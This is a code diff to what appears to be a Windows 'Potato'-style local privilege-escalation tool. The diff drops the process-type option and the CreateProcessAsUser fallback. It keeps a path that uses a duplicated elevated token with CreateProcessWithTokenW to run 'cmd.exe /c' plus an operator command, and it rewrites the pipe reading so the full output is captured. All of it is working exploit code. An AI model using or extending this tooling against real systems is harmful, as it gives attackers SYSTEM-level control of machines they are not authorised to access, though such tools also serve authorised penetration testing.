@@ -35,7 +35,7 @@ BOOL TEST_mode = FALSE;
 HANDLE elevated_token, duped_token;
 
 int PotatoAPI::newConnection;
-wchar_t *processtype = L"*";
+wchar_t *processtype = L"t";
 wchar_t *processargs = NULL;
 wchar_t *processname = NULL;
 
@@ -83,7 +83,6 @@ void usage()
 
 	printf("\n\n");
 	printf("Optional args: \n"
-		"-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both (default *)\n"
 		"-m <ip>: COM server listen address (default 127.0.0.1)\n"
 		"-k <ip>: RPC server ip address (default 127.0.0.1)\n"
 		"-n <port>: RPC server listen port (default 135)\n"
@@ -549,12 +548,6 @@ int wmain(int argc, wchar_t** argv)
 	{
 		switch (argv[1][1])
 		{
-			case 't':
-				++argv;
-				--argc;
-				processtype = argv[1];
-				break;
-
 			case 'l':
 				++argv;
 				--argc;
@@ -641,11 +634,6 @@ BOOL CreateProcessWithOutput(HANDLE hToken) {
 
 	DWORD sessionId = WTSGetActiveConsoleSessionId();
 
-	fflush(stdout);
-	wchar_t command[256];
-	wcscpy(command, L"cmd.exe /c ");
-	wcsncat(command, processname, wcslen(processname));
-	
 	HANDLE hReadPipe = NULL;
 	HANDLE hWritePipe = NULL;
 
@@ -661,65 +649,51 @@ BOOL CreateProcessWithOutput(HANDLE hToken) {
 	si.wShowWindow = SW_HIDE;
 	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
 	si.cb = sizeof(STARTUPINFO);
-	si.lpDesktop = L"winsta0\\default";
+	si.lpDesktop = (LPWSTR)L"winsta0\\default";
 
-	if (*processtype == 't' || *processtype == '*') {
-		result = CreateProcessWithTokenW(
-			duped_token,
-			0, NULL,
-			command,
-			0, NULL, NULL,
-			&si, &pi);
+	fflush(stdout);
+	wchar_t command[256];
+	wcscpy_s(command, L"cmd.exe /c ");
+	wcsncat_s(command, processname, wcslen(processname));
 
-		if (!result) {
-			printf("\n[-] CreateProcessWithTokenW Failed to create proc: %d\n", GetLastError());
-		} else {
-			printf("\n[+] CreateProcessWithTokenW OK\n");
-			goto RECV_OUTPUT;
-		}
+	LPWSTR pwszCurrentDirectory = (LPWSTR)malloc(sizeof(WCHAR) * 512);
+	GetCurrentDirectoryW(512, pwszCurrentDirectory);
+	if (!CreateProcessWithTokenW(hToken, LOGON_WITH_PROFILE, NULL, command, 0, NULL, pwszCurrentDirectory, &si, &pi)) {
+		wprintf(L"CreateProcessWithTokenW() failed. Error: %d\n", GetLastError());
+		goto CLEANUP;
+	}
+	else {
+		wprintf(L"[+] CreateProcessWithTokenW() OK\n");
+		goto RECV_OUTPUT;
 	}
 
-	if (*processtype == 'u' || *processtype == '*') {
-		result = CreateProcessAsUserW(
-			duped_token,
-			NULL,
-			command,
-			NULL, NULL,
-			FALSE, 0, NULL,
-			L"C:\\", &si, &pi
-		);
-
-		if (!result) {
-			printf("\n[-] CreateProcessAsUser Failed to create proc: %d\n", GetLastError());
-		}
-		else {
-			printf("\n[+] CreateProcessAsUser OK\n");
-			goto RECV_OUTPUT;
-		}
-	}
-	
 CLEANUP:
 	CloseHandle(pi.hThread);
 	CloseHandle(pi.hProcess);
-	CloseHandle(hWritePipe);
 	CloseHandle(hReadPipe);
-
+	free(pwszCurrentDirectory);
 	return result;
 
 RECV_OUTPUT:
 	const int dwResultBufferSize = 1024;
-	const DWORD timeout = 1000 * 10;
+	const DWORD timeout = 1000;
 	char pszResultBuffer[dwResultBufferSize];
 
-	WaitForSingleObject(pi.hThread, timeout);
 	WaitForSingleObject(pi.hProcess, timeout);
-	RtlZeroMemory(pszResultBuffer, dwResultBufferSize);
-	ReadFile(hReadPipe, pszResultBuffer, dwResultBufferSize, NULL, NULL);
+	CloseHandle(hWritePipe);
 
 	printf("\n====================CMD===================\n%ws\n", command);
-	printf(
-		"\n==================OUTPUT==================\n%s\n==========================================",
-		pszResultBuffer);
+	printf("\n==================OUTPUT==================\n");
+
+	DWORD n = 0;
+	do {
+		RtlZeroMemory(pszResultBuffer, dwResultBufferSize);
+		ReadFile(hReadPipe, pszResultBuffer, dwResultBufferSize, &n, NULL);
+		printf("%s", pszResultBuffer);
+		// if (pszResultBuffer[n] == EOF) break;
+	} while (n);
+
+	printf("\n==========================================");
 	goto CLEANUP;
 };
 
